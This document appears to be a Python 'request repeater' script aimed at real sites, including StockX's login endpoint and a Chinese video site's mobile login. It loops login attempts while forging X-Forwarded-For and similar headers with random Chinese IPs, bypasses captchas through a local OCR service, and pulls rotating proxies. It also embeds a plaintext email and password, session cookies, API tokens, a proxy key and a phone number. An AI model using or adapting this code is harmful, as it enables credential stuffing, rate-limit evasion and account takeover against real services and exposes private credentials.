import json
import random
import sys
import time
from datetime import datetime
from urllib import parse
import execjs

import requests
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.proxy import Proxy
from selenium.webdriver.common.by import By
from selenium.webdriver.common.proxy import ProxyType

node = execjs.get()


# 中国ip函数
def get_ip():
    ips = ['58.14.0.0', '58.16.0.0', '58.24.0.0', '58.30.0.0', '58.32.0.0', '58.66.0.0', '58.68.128.0', '58.82.0.0',
           '58.87.64.0', '58.99.128.0', '58.100.0.0', '58.116.0.0', '58.128.0.0', '58.144.0.0', '58.154.0.0',
           '58.192.0.0',
           '58.240.0.0', '59.32.0.0', '59.64.0.0', '59.80.0.0', '59.107.0.0', '59.108.0.0', '59.151.0.0',
           '59.155.0.0',
           '59.172.0.0', '59.191.0.0', '59.191.240.0', '59.192.0.0', '60.0.0.0', '60.55.0.0', '60.63.0.0',
           '60.160.0.0',
           '60.194.0.0', '60.200.0.0', '60.208.0.0', '60.232.0.0', '60.235.0.0', '60.245.128.0', '60.247.0.0',
           '60.252.0.0',
           '60.253.128.0', '60.255.0.0', '61.4.80.0', '61.4.176.0', '61.8.160.0', '61.28.0.0', '61.29.128.0',
           '61.45.128.0',
           '61.47.128.0', '61.48.0.0', '61.87.192.0', '61.128.0.0', '61.232.0.0', '61.236.0.0', '61.240.0.0',
           '114.28.0.0',
           '114.54.0.0', '114.60.0.0', '114.64.0.0', '114.68.0.0', '114.80.0.0', '116.1.0.0', '116.2.0.0',
           '116.4.0.0',
           '116.8.0.0', '116.13.0.0', '116.16.0.0', '116.52.0.0', '116.56.0.0', '116.58.128.0', '116.58.208.0',
           '116.60.0.0',
           '116.66.0.0', '116.69.0.0', '116.70.0.0', '116.76.0.0', '116.89.144.0', '116.90.184.0', '116.95.0.0',
           '116.112.0.0',
           '116.116.0.0', '116.128.0.0', '116.192.0.0', '116.193.16.0', '116.193.32.0', '116.194.0.0',
           '116.196.0.0',
           '116.198.0.0', '116.199.0.0', '116.199.128.0', '116.204.0.0', '116.207.0.0', '116.208.0.0',
           '116.212.160.0',
           '116.213.64.0', '116.213.128.0', '116.214.32.0', '116.214.64.0', '116.214.128.0', '116.215.0.0',
           '116.216.0.0',
           '116.224.0.0', '116.242.0.0', '116.244.0.0', '116.248.0.0', '116.252.0.0', '116.254.128.0',
           '116.255.128.0',
           '117.8.0.0', '117.21.0.0', '117.22.0.0', '117.24.0.0', '117.32.0.0', '117.40.0.0', '117.44.0.0',
           '117.48.0.0',
           '117.53.48.0', '117.53.176.0', '117.57.0.0', '117.58.0.0', '117.59.0.0', '117.60.0.0', '117.64.0.0',
           '117.72.0.0',
           '117.74.64.0', '117.74.128.0', '117.75.0.0', '117.76.0.0', '117.80.0.0', '117.100.0.0', '117.103.16.0',
           '117.103.128.0', '117.106.0.0', '117.112.0.0', '117.120.64.0', '117.120.128.0', '117.121.0.0',
           '117.121.128.0',
           '117.121.192.0', '117.122.128.0', '117.124.0.0', '117.128.0.0', '118.24.0.0', '118.64.0.0', '118.66.0.0',
           '118.67.112.0', '118.72.0.0', '118.80.0.0', '118.84.0.0', '118.88.32.0', '118.88.64.0', '118.88.128.0',
           '118.89.0.0',
           '118.91.240.0', '118.102.16.0', '118.112.0.0', '118.120.0.0', '118.124.0.0', '118.126.0.0',
           '118.132.0.0',
           '118.144.0.0', '118.178.0.0', '118.180.0.0', '118.184.0.0', '118.192.0.0', '118.212.0.0', '118.224.0.0',
           '118.228.0.0', '118.230.0.0', '118.239.0.0', '118.242.0.0', '118.244.0.0', '118.248.0.0', '119.0.0.0',
           '119.2.0.0',
           '119.2.128.0', '119.3.0.0', '119.4.0.0', '119.8.0.0', '119.10.0.0', '119.15.136.0', '119.16.0.0',
           '119.18.192.0',
           '119.18.208.0', '119.18.224.0', '119.19.0.0', '119.20.0.0', '119.27.64.0', '119.27.160.0',
           '119.27.192.0',
           '119.28.0.0', '119.30.48.0', '119.31.192.0', '119.32.0.0', '119.40.0.0', '119.40.64.0', '119.40.128.0',
           '119.41.0.0',
           '119.42.0.0', '119.42.136.0', '119.42.224.0', '119.44.0.0', '119.48.0.0', '119.57.0.0', '119.58.0.0',
           '119.59.128.0',
           '119.60.0.0', '119.62.0.0', '119.63.32.0', '119.75.208.0', '119.78.0.0', '119.80.0.0', '119.84.0.0',
           '119.88.0.0',
           '119.96.0.0', '119.108.0.0', '119.112.0.0', '119.128.0.0', '119.144.0.0', '119.148.160.0',
           '119.161.128.0',
           '119.162.0.0', '119.164.0.0', '119.176.0.0', '119.232.0.0', '119.235.128.0', '119.248.0.0',
           '119.253.0.0',
           '119.254.0.0', '120.0.0.0', '120.24.0.0', '120.30.0.0', '120.32.0.0', '120.48.0.0', '120.52.0.0',
           '120.64.0.0',
           '120.72.32.0', '120.72.128.0', '120.76.0.0', '120.80.0.0', '120.90.0.0', '120.92.0.0', '120.94.0.0',
           '120.128.0.0',
           '120.136.128.0', '120.137.0.0', '120.192.0.0', '121.0.16.0', '121.4.0.0', '121.8.0.0', '121.16.0.0',
           '121.32.0.0',
           '121.40.0.0', '121.46.0.0', '121.48.0.0', '121.51.0.0', '121.52.160.0', '121.52.208.0', '121.52.224.0',
           '121.55.0.0',
           '121.56.0.0', '121.58.0.0', '121.58.144.0', '121.59.0.0', '121.60.0.0', '121.68.0.0', '121.76.0.0',
           '121.79.128.0',
           '121.89.0.0', '121.100.128.0', '121.101.208.0', '121.192.0.0', '121.201.0.0', '121.204.0.0',
           '121.224.0.0',
           '121.248.0.0', '121.255.0.0', '122.0.64.0', '122.0.128.0', '122.4.0.0', '122.8.0.0', '122.48.0.0',
           '122.49.0.0',
           '122.51.0.0', '122.64.0.0', '122.96.0.0', '122.102.0.0', '122.102.64.0', '122.112.0.0', '122.119.0.0',
           '122.136.0.0',
           '122.144.128.0', '122.152.192.0', '122.156.0.0', '122.192.0.0', '122.198.0.0', '122.200.64.0',
           '122.204.0.0',
           '122.224.0.0', '122.240.0.0', '122.248.48.0', '123.0.128.0', '123.4.0.0', '123.8.0.0', '123.49.128.0',
           '123.52.0.0',
           '123.56.0.0', '123.64.0.0', '123.96.0.0', '123.98.0.0', '123.99.128.0', '123.100.0.0', '123.101.0.0',
           '123.103.0.0',
           '123.108.128.0', '123.108.208.0', '123.112.0.0', '123.128.0.0', '123.136.80.0', '123.137.0.0',
           '123.138.0.0',
           '123.144.0.0', '123.160.0.0', '123.176.80.0', '123.177.0.0', '123.178.0.0', '123.180.0.0', '123.184.0.0',
           '123.196.0.0', '123.199.128.0', '123.206.0.0', '123.232.0.0', '123.242.0.0', '123.244.0.0',
           '123.249.0.0',
           '123.253.0.0', '124.6.64.0', '124.14.0.0', '124.16.0.0', '124.20.0.0', '124.28.192.0', '124.29.0.0',
           '124.31.0.0',
           '124.40.112.0', '124.40.128.0', '124.42.0.0', '124.47.0.0', '124.64.0.0', '124.66.0.0', '124.67.0.0',
           '124.68.0.0',
           '124.72.0.0', '124.88.0.0', '124.108.8.0', '124.108.40.0', '124.112.0.0', '124.126.0.0', '124.128.0.0',
           '124.147.128.0', '124.156.0.0', '124.160.0.0', '124.172.0.0', '124.192.0.0', '124.196.0.0',
           '124.200.0.0',
           '124.220.0.0', '124.224.0.0', '124.240.0.0', '124.240.128.0', '124.242.0.0', '124.243.192.0',
           '124.248.0.0',
           '124.249.0.0', '124.250.0.0', '124.254.0.0', '125.31.192.0', '125.32.0.0', '125.58.128.0',
           '125.61.128.0',
           '125.62.0.0', '125.64.0.0', '125.96.0.0', '125.98.0.0', '125.104.0.0', '125.112.0.0', '125.169.0.0',
           '125.171.0.0',
           '125.208.0.0', '125.210.0.0', '125.213.0.0', '125.214.96.0', '125.215.0.0', '125.216.0.0',
           '125.254.128.0',
           '134.196.0.0', '159.226.0.0', '161.207.0.0', '162.105.0.0', '166.111.0.0', '167.139.0.0', '168.160.0.0',
           '169.211.1.0', '192.83.122.0', '192.83.169.0', '192.124.154.0', '192.188.170.0', '198.17.7.0',
           '202.0.110.0',
           '202.0.176.0', '202.4.128.0', '202.4.252.0', '202.8.128.0', '202.10.64.0', '202.14.88.0', '202.14.235.0',
           '202.14.236.0', '202.14.238.0', '202.20.120.0', '202.22.248.0', '202.38.0.0', '202.38.64.0',
           '202.38.128.0',
           '202.38.136.0', '202.38.138.0', '202.38.140.0', '202.38.146.0', '202.38.149.0', '202.38.150.0',
           '202.38.152.0',
           '202.38.156.0', '202.38.158.0', '202.38.160.0', '202.38.164.0', '202.38.168.0', '202.38.176.0',
           '202.38.184.0',
           '202.38.192.0', '202.41.152.0', '202.41.240.0', '202.43.144.0', '202.46.32.0', '202.46.224.0',
           '202.60.112.0',
           '202.63.248.0', '202.69.4.0', '202.69.16.0', '202.70.0.0', '202.74.8.0', '202.75.208.0', '202.85.208.0',
           '202.90.0.0', '202.90.224.0', '202.90.252.0', '202.91.0.0', '202.91.128.0', '202.91.176.0',
           '202.91.224.0',
           '202.92.0.0', '202.92.252.0', '202.93.0.0', '202.93.252.0', '202.95.0.0', '202.95.252.0', '202.96.0.0',
           '202.112.0.0', '202.120.0.0', '202.122.0.0', '202.122.32.0', '202.122.64.0', '202.122.112.0',
           '202.122.128.0',
           '202.123.96.0', '202.124.24.0', '202.125.176.0', '202.127.0.0', '202.127.12.0', '202.127.16.0',
           '202.127.40.0',
           '202.127.48.0', '202.127.112.0', '202.127.128.0', '202.127.160.0', '202.127.192.0', '202.127.208.0',
           '202.127.212.0',
           '202.127.216.0', '202.127.224.0', '202.130.0.0', '202.130.224.0', '202.131.16.0', '202.131.48.0',
           '202.131.208.0',
           '202.136.48.0', '202.136.208.0', '202.136.224.0', '202.141.160.0', '202.142.16.0', '202.143.16.0',
           '202.148.96.0',
           '202.149.160.0', '202.149.224.0', '202.150.16.0', '202.152.176.0', '202.153.48.0', '202.158.160.0',
           '202.160.176.0',
           '202.164.0.0', '202.164.25.0', '202.165.96.0', '202.165.176.0', '202.165.208.0', '202.168.160.0',
           '202.170.128.0',
           '202.170.216.0', '202.173.8.0', '202.173.224.0', '202.179.240.0', '202.180.128.0', '202.181.112.0',
           '202.189.80.0',
           '202.192.0.0', '203.18.50.0', '203.79.0.0', '203.80.144.0', '203.81.16.0', '203.83.56.0', '203.86.0.0',
           '203.86.64.0', '203.88.32.0', '203.88.192.0', '203.89.0.0', '203.90.0.0', '203.90.128.0', '203.90.192.0',
           '203.91.32.0', '203.91.96.0', '203.91.120.0', '203.92.0.0', '203.92.160.0', '203.93.0.0', '203.94.0.0',
           '203.95.0.0',
           '203.95.96.0', '203.99.16.0', '203.99.80.0', '203.100.32.0', '203.100.80.0', '203.100.96.0',
           '203.100.192.0',
           '203.110.160.0', '203.118.192.0', '203.119.24.0', '203.119.32.0', '203.128.32.0', '203.128.96.0',
           '203.130.32.0',
           '203.132.32.0', '203.134.240.0', '203.135.96.0', '203.135.160.0', '203.142.219.0', '203.148.0.0',
           '203.152.64.0',
           '203.156.192.0', '203.158.16.0', '203.161.192.0', '203.166.160.0', '203.171.224.0', '203.174.7.0',
           '203.174.96.0',
           '203.175.128.0', '203.175.192.0', '203.176.168.0', '203.184.80.0', '203.187.160.0', '203.190.96.0',
           '203.191.16.0',
           '203.191.64.0', '203.191.144.0', '203.192.0.0', '203.196.0.0', '203.207.64.0', '203.207.128.0',
           '203.208.0.0',
           '203.208.16.0', '203.208.32.0', '203.209.224.0', '203.212.0.0', '203.212.80.0', '203.222.192.0',
           '203.223.0.0',
           '210.2.0.0', '210.5.0.0', '210.5.144.0', '210.12.0.0', '210.14.64.0', '210.14.112.0', '210.14.128.0',
           '210.15.0.0',
           '210.15.128.0', '210.16.128.0', '210.21.0.0', '210.22.0.0', '210.23.32.0', '210.25.0.0', '210.26.0.0',
           '210.28.0.0',
           '210.32.0.0', '210.51.0.0', '210.52.0.0', '210.56.192.0', '210.72.0.0', '210.76.0.0', '210.78.0.0',
           '210.79.64.0',
           '210.79.224.0', '210.82.0.0', '210.87.128.0', '210.185.192.0', '210.192.96.0', '211.64.0.0',
           '211.80.0.0',
           '211.96.0.0', '211.136.0.0', '211.144.0.0', '211.160.0.0', '218.0.0.0', '218.56.0.0', '218.64.0.0',
           '218.96.0.0',
           '218.104.0.0', '218.108.0.0', '218.185.192.0', '218.192.0.0', '218.240.0.0', '218.249.0.0', '219.72.0.0',
           '219.82.0.0', '219.128.0.0', '219.216.0.0', '219.224.0.0', '219.242.0.0', '219.244.0.0', '220.101.192.0',
           '220.112.0.0', '220.152.128.0', '220.154.0.0', '220.160.0.0', '220.192.0.0', '220.231.0.0',
           '220.231.128.0',
           '220.232.64.0', '220.234.0.0', '220.242.0.0', '220.248.0.0', '220.252.0.0', '221.0.0.0', '221.8.0.0',
           '221.12.0.0',
           '221.12.128.0', '221.13.0.0', '221.14.0.0', '221.122.0.0', '221.129.0.0', '221.130.0.0', '221.133.224.0',
           '221.136.0.0', '221.172.0.0', '221.176.0.0', '221.192.0.0', '221.196.0.0', '221.198.0.0', '221.199.0.0',
           '221.199.128.0', '221.199.192.0', '221.199.224.0', '221.200.0.0', '221.208.0.0', '221.224.0.0',
           '222.16.0.0',
           '222.32.0.0', '222.64.0.0', '222.125.0.0', '222.126.128.0', '222.128.0.0', '222.160.0.0', '222.168.0.0',
           '222.176.0.0', '222.192.0.0', '222.240.0.0', '222.248.0.0']
    rnd = random.randint(0, len(ips) - 1)
    ip = ips[rnd]
    _ip = ip.split('.')
    for i, v in enumerate(_ip):
        if int(v) == 0:
            _ip[i] = str(random.randint(0, 255))
    ip = '.'.join(_ip)
    return ip


# 无限重发
def repeats():
    with open(sys.path[0] + '/' + str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "") + 'out.txt',
              'a+', encoding='utf-8') as f:
        test = [1, 2, 3, 4]
        for i in range(100):
            ip = get_ip()

            url = 'https://accounts.stockx.com/usernamepassword/login'
            headers = {'Host': 'accounts.stockx.com', 'Connection': 'keep-alive', 'Content-Length': '543',
                       'Pragma': 'no-cache', 'Cache-Control': 'no-cache',
                       'sec-ch-ua': '"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"',
                       'Content-Type': 'application/json',
                       'Auth0-Client': 'eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMTAuNCJ9',
                       'sec-ch-ua-mobile': '?0',
                       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
                       'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Origin': 'https://accounts.stockx.com',
                       'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty',
                       'Referer': 'https://accounts.stockx.com/login?state=hKFo2SBEdTBITkZnOXRISGJ0VXd6WGtabTF6VWs5TzVvb0NYbKFupWxvZ2luo3RpZNkgYzRtcVRFRGMyeUFFalRjQjhwMWxYYTRlTzZDdHFyVVGjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA&client=OVxrt4VJqTx7LIUKd661W0DuVMpcFByD&protocol=oauth2&prompt=login&audience=gateway.stockx.com&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4xIn0%3D&connection=production&lng=zh&redirect_uri=https%3A%2F%2Fstockx.com%2Fcallback%3Fpath%3D%2Fzh-cn&response_mode=query&response_type=code&scope=openid%20profile&stockx-currency=USD&stockx-default-tab=login&stockx-is-gdpr=false&stockx-language=zh-cn&stockx-session-id=2d8f2d60-358c-4f72-9d88-e6a5f83feea2&stockx-url=https%3A%2F%2Fstockx.com&stockx-user-agent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F106.0.0.0%20Safari%2F537.36%20Edg%2F106.0.1370.42&ui_locales=zh-CN',
                       'Accept-Encoding': 'gzip, deflate, br',
                       'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6', 'Cient_ip': ip,
                       'X-Forwarded-For': ip,
                       'X-Originating-IP': ip, 'X-Remote-IP': ip, 'X-Remote-Addr': ip}
            cookies = {'_csrf': '3mOhHftqo-OXtR4DBjcDUVUZ', '_pxvid': '24d89445-49f3-11ed-b089-50706f744c58',
                       '__pxvid': '2558ea16-49f3-11ed-8c5a-0242ac120002', '__ssid': '35d25268ae9eac82a15aec2277bc6ca',
                       'lastRskxRun': '1665554416865', 'rskxRunCookie': '0', 'rCookie': 'cu397e3yes5ka8w5hd6bll9583h0i',
                       'ajs_anonymous_id': '7350e34e-713d-4747-b302-e4c974db3d99',
                       '_gcl_au': '1.1.2006874050.1665554419', 'rbuid': 'rbos-0086f337-a5db-47ad-abb7-62ac6d80dd47',
                       'did': 's%3Av0%3A45e24250-49f3-11ed-9db3-6d5ba85dfce8.pLJ3xi3e%2ByLk5LVXSiwFyRSNW6UjfIstCJkiELbdiXc',
                       'auth0': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQM8fX-JaxeSWj8cwsnsR2uZ8J4MvdBNX0OXggIbAKaIdu6q3vDoZeacD_coIHwDK5cOL6NGkI7cE6WX1DoU4FxmmY29va2llg6dleHBpcmVz1_-rqVAAY0pMp65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.A7H3CAXzo%2BPuxxhFv4QZsc5opQ3vRsfM2Osm1IZKi9A',
                       'did_compat': 's%3Av0%3A45e24250-49f3-11ed-9db3-6d5ba85dfce8.pLJ3xi3e%2ByLk5LVXSiwFyRSNW6UjfIstCJkiELbdiXc',
                       'auth0_compat': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQM8fX-JaxeSWj8cwsnsR2uZ8J4MvdBNX0OXggIbAKaIdu6q3vDoZeacD_coIHwDK5cOL6NGkI7cE6WX1DoU4FxmmY29va2llg6dleHBpcmVz1_-rqVAAY0pMp65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.A7H3CAXzo%2BPuxxhFv4QZsc5opQ3vRsfM2Osm1IZKi9A',
                       'QuantumMetricUserID': '378116bf6ce7480a1a4a9ddc59a353f7',
                       'pxcts': '16ac0def-4c34-11ed-9881-4a6145457766', '_clck': '6wqy4|1|f5q|0',
                       'forterToken': '1f5d2c3dc6034949bdbe239f1a4ed33f_1665802217222__UDF43_13ck',
                       'language_code': 'zh', 'QuantumMetricSessionID': '6067e050cf241f874cb4fbf61ff860a6',
                       '_px3': '2cb6f68ebf72aa53553a47de69d1b6360a39b6a754ecac61db512944885d6ae6:ffyPP6sjbfvJsVllm9OvaaWa2kiM5sGaeL6vXKVIGb9mQwzEaVmPDuogj5c0bl3j32qSPAhmU4eK7U3mpvEY1Q',
                       '_pxde': '23cdddc3c31930ec387d365a805305caae47da7bb0c19437723853b378bd09c3:eyJ0aW1lc3RhbXAiOjE2NjU4MDI5NTE4MDQsImZfa2IiOjB9',
                       '_clsk': '15trjb5|1665803096674|2|0|l.clarity.ms/collect',
                       '__cf_bm': 'uRQ9yRS6i38qHf8OXeebmifMU6ZB0jROoN2tyNdRTi4-1665803137-0-AdC/GKemUOlK1sRl6foUNvlt0mB/j6Ldw+1yjGmL53ZRgs1+mzsMt4v6MNZD7SJ7WQE7uDec2ONIwtX3K33f9aU',
                       '_uetsid': '1afcee304c3411ed89505d9bedf2acf2', '_uetvid': '2683d41049f311eda2beed482f7df48e',
                       '_dd_s': 'logs'}
            data = '{"client_id":"OVxrt4VJqTx7LIUKd661W0DuVMpcFByD","redirect_uri":"https://stockx.com/callback?path=/zh-cn","tenant":"stockx-prod","response_type":"code","scope":"openid profile","audience":"gateway.stockx.com","_csrf":"kMa41xeK-dxvibLJvCK2gBSsyR-iF4GFpjWo","state":"hKFo2SBEdTBITkZnOXRISGJ0VXd6WGtabTF6VWs5TzVvb0NYbKFupWxvZ2luo3RpZNkgYzRtcVRFRGMyeUFFalRjQjhwMWxYYTRlTzZDdHFyVVGjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA","_intstate":"deprecated","username":"roland.esakia@gmail.com","password":"Roll332211","connection":"production"}'

            # html = requests.post(url, headers=headers, verify=False, cookies=cookies, data=data)
            html = requests.post(url, headers=headers, verify=False, cookies=cookies, data=data)
            thes = json.loads(html.text)
            if thes['statusCode'] != 400:  # 429
                print(html.text)
                # print(html.text.decode(''))
                f.writelines(html.text)
                f.flush()


# 读文件重发
def open_txt():
    with open(sys.path[0] + '/' + str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "") + 'out.txt',
              'a+', encoding='utf-8') as f:
        with open(sys.path[0] + '/test.txt', 'r', encoding='utf-8') as f:
            read_data = f.readlines()
            for i in range(len(read_data)):
                line = read_data[i].strip()
                txt = parse.quote(line, 'utf-8')
                url = 'http://zjfjdc.zjjt365.com:5002/hz_mysql_api/BatteryBinding/checkCjhDc?token=0571_2c2df305-38b4-4b62-99fd-31e2e02cf932&city=0571&cjhurl=http%3A%2F%2Fwww.pzcode.cn%2Fvin%2F140522209851110&dcbhurl=' + txt
                headers = {'Host': 'zjfjdc.zjjt365.com:5002', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
                cookies = {'SERVERID': '941743a4a2850041e1e7cef946493742|1663769338|1663759342'}
                data = {}

                html = requests.get(url, headers=headers, verify=False, cookies=cookies)
                print(html.text)


# 读文件重发带验证码
def open_txt_yzm():
    with open(sys.path[0] + '/' + str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "") + 'out.txt',
              'a+', encoding='utf-8') as f2:
        with open('repeat_request_tool_js.js', encoding='utf-8') as js_code:
            ctx = node.compile(js_code.read())
            with open(sys.path[0] + '/test.txt', 'r', encoding='utf-8') as f:
                read_data = f.readlines()
                for i in range(len(read_data)):
                    line = read_data[i].strip()
                    txt = parse.quote(line, 'utf-8')
                    ip = get_ip()

                    s = ctx.call("maincompute")
                    res = requests.post("")
                    vurl = "http://127.0.0.1:8899/base64"
                    data_ = json.loads(res.text)['data']
                    #b'base64=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
                    res1 = requests.post(vurl,
                                         data=data_)
                    v1 = res1.text

                    burp0_url = "https://v.qijiduanju.com:443/api/user/mobilelogin"
                    burp0_cookies = {
                        "_vid_t": "Woby1m4asqMbmesy8GZJ4byEecyndV2hMoczqfTKaiXpjltfp9tDaZOck0R3x5u9PEN6vkEGhXXiKgadi967s05RIA=="}
                    burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache",
                                     "Sec-Ch-Ua": "\"Chromium\";v=\"112\", \"Microsoft Edge\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
                                     "Locale": "zh_CN", "Sec-Ch-Ua-Mobile": "?0",
                                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.68",
                                     "Content-Type": "application/json;charset=UTF-8", "X-Requested-Token": "",
                                     "Token": "", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept": "*/*",
                                     "Origin": "https://v.qijiduanju.com", "Sec-Fetch-Site": "same-origin",
                                     "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
                                     "Referer": "https://v.qijiduanju.com/h5/index.html",
                                     "Accept-Encoding": "gzip, deflate",
                                     "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6"}
                    burp0_json = {"captcha": v1, "code": "", "codeid": "13e40d826762f654cadc6a22115432f2",
                                  "deviceid": "7jyz", "event": "login", "mobile": "17680492987",
                                  "opcodes": "fVUg0niB8biUbvTVwFEj", "source": "windows", "tcode": 1683371922,
                                  "versionNum": "1.0.9"}
                    res2 = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)

                    if res2.status_code != 400:  # 429
                        print(res2.text)
                        # print(html.text.decode(''))
                        f2.writelines(res2.text)
                        f2.flush()


# 读文件切割重发
def open_txt2():
    with open(sys.path[0] + '/z.txt', 'r', encoding='utf-8') as f:
        read_data = f.readlines()
        for i in range(len(read_data)):
            line = read_data[i].strip()
            txt2 = line.split("\t")
            # ip = get_ip()
            ip = requests.get(
                'http://17680492987.user.xiecaiyun.com/api/proxies?action=getText&key=NP4A43A3ED&count=1&word=&rand=true&norepeat=false&detail=false&ltime=0')
